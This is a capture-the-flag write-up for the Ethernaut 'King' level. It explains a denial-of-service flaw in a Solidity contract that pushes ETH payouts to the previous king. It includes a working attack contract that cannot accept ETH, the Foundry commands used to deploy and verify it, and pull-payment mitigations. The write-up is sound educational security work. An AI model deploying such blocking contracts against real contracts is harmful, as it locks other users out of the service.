# Ethernaut #9 — King

## Objective

Claim the throne by becoming the king, then prevent anyone else from taking it.

## Vulnerability: Denial of Service Through a Failed ETH Payout

The `King` contract allows anyone to become king by sending ETH greater than or equal to the current prize. When a new user claims the throne, the contract pays the previous king the challenger's payment using `transfer()`.

The problem is that this payout must succeed for the transaction to complete. If the current king is a contract that rejects incoming ETH, the payout fails and the entire transaction reverts.

By making a contract that becomes king but cannot receive ETH, an attacker can prevent anyone else from claiming the throne.

## Root Cause

The contract relies on an external ETH transfer succeeding before it can update the king and prize.

The developer assumes that the current king will always be able to receive ETH. However, a contract can reject ETH transfers, causing the payout to revert. Because the payout is part of the same transaction, the entire operation fails, preventing the king and prize from being updated.

The underlying issue is coupling the core state transition to a successful external payment.

## Attack Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TakeThrone {
    // Address of my Ethernaut King instance. Replace with yours.
    address immutable king = 0x2d9085787FcFf3FA0F102D23D0fAA8b560609d05;

    constructor() payable {
        require(address(this).balance > 0.001 ether);

        (bool success, ) = payable(king).call{
            value: address(this).balance
        }("");

        require(success, "Transfer failed");
    }
}
```

The attack contract is intentionally minimal. It doesn't need a separate attack function because the entire attack happens in its constructor.

- The `payable` constructor allows ETH to be sent alongside deployment.
- The balance check ensures the contract holds more than `0.001 ETH`. I chose this threshold to exceed the prize I read from the instance beforehand.
- The low-level call forwards the contract's entire balance to the King contract.
- The contract has neither a payable `receive()` function nor a payable fallback function, so it rejects ordinary ETH transfers.

The last point is what makes the attack work. The attacker contract can send ETH to the King contract, but it cannot accept the payout when someone tries to outbid it.

## Exploit

### 1. Understand the target contract

The important part of the King contract is its `receive()` function:

```solidity
receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
}
```

A new challenger must send at least the current prize. The contract then pays the previous king the challenger's payment, and only afterwards updates the king and prize.

If that payout fails, execution reverts and the state changes never happen.

### 2. Read the prize

The prize is exposed through the public `prize` variable. I read it before deploying, to decide how much to send.

```bash
cast call <KING_CONTRACT_ADDRESS> \
  "prize()(uint256)" \
  --rpc-url $SEPOLIA_RPC_URL
```

The result was returned in wei. I converted it to ETH using:

```bash
cast to-unit <VALUE_IN_WEI> ether
```

### 3. Deploy the attacker contract with ETH

The constructor must be payable so it can receive ETH during deployment. I used Foundry's `forge create` with `--value` to fund it:

```bash
forge create src/TakeThrone.sol:TakeThrone \
  --value 0.002ether \
  --rpc-url $SEPOLIA_RPC_URL \
  --account <KEYSTORE_NAME> \
  --broadcast
```

This sends `0.002 ETH` alongside the deployment transaction. The constructor forwards that ETH to the King contract, making the attacker contract the new king. The constructor takes no arguments, so no constructor args are needed.

I ran this on a local fork first to check the behaviour, then deployed the same contract against my Ethernaut instance on Sepolia. The key is stored in an encrypted Foundry keystore, which keeps it out of the command and the shell history.

### 4. Read the current king

I initially tried calling `king()`, but the actual getter in this instance was `_king()`.

```bash
cast call <KING_CONTRACT_ADDRESS> \
  "_king()(address)" \
  --rpc-url $SEPOLIA_RPC_URL
```

This returned the attacker contract's address, confirming that it had become king.

### 5. Attempt to outbid the attacker contract

On the local fork, I tried sending a larger amount of ETH to the King contract using `cast send`:

```bash
cast send <KING_CONTRACT_ADDRESS> \
  --value <AMOUNT_GREATER_THAN_PRIZE> \
  --rpc-url http://127.0.0.1:8545 \
  --account <KEYSTORE_NAME>
```

The fork returned an execution revert during gas estimation, so no transaction was broadcast.

The reason was the payout to the attacker contract. Since `TakeThrone` has no payable `receive()` or fallback function, it cannot accept the transfer. The King contract's payout fails, reverting the entire outbid transaction.

### 6. Verify the state and complete the level

I checked `_king()` and `prize()` again. The failed outbid did not change the state, so the attacker contract was still king.

I then submitted the level on Ethernaut.

## Impact

A malicious user can permanently prevent anyone else from becoming king by making a contract that rejects ETH transfers when it is the current king.

The vulnerability causes a denial of service: the contract's main functionality becomes unavailable to other users because every outbid attempt triggers a payout that cannot succeed.

## Key Takeaways

- External calls can revert an entire transaction.
- Contracts can reject ETH transfers by omitting a payable `receive()` and payable fallback function.
- A contract can send ETH to another contract without necessarily being able to receive ETH itself.
- `payable` constructors can receive ETH during deployment.
- `cast call` is useful for inspecting contract state, while `cast send` submits transactions.
- Failed transactions revert state changes made during execution.
- The vulnerability is not simply that a transfer fails; it is that a critical protocol operation depends on that transfer succeeding.

## Mitigation

- Avoid coupling critical state transitions to successful ETH payouts.
- Use a pull-payment pattern: update the king and prize, record the previous king's amount as a pending withdrawal, and let the recipient withdraw it separately. A hostile recipient then only harms itself.
- Reordering alone does not fix this. Even if the contract updated `king` and `prize` before the `transfer`, a failing `transfer` would still revert the whole transaction, including those updates. The fix is removing the push, not moving it.
- Be careful with the call style. Replacing `transfer` with a low-level `call` and then requiring success brings back the same blocking behaviour. A failed payout must not be able to block unrelated functionality.

## Conclusion

The King level demonstrates how a seemingly reasonable ETH payout can create a denial-of-service vulnerability.

The attack required no complex logic or privileged access. A minimal contract that becomes king and rejects incoming ETH was enough to prevent future challengers from taking the throne.

The key lesson is to treat external calls as potential failure points and avoid making essential state transitions depend on their success.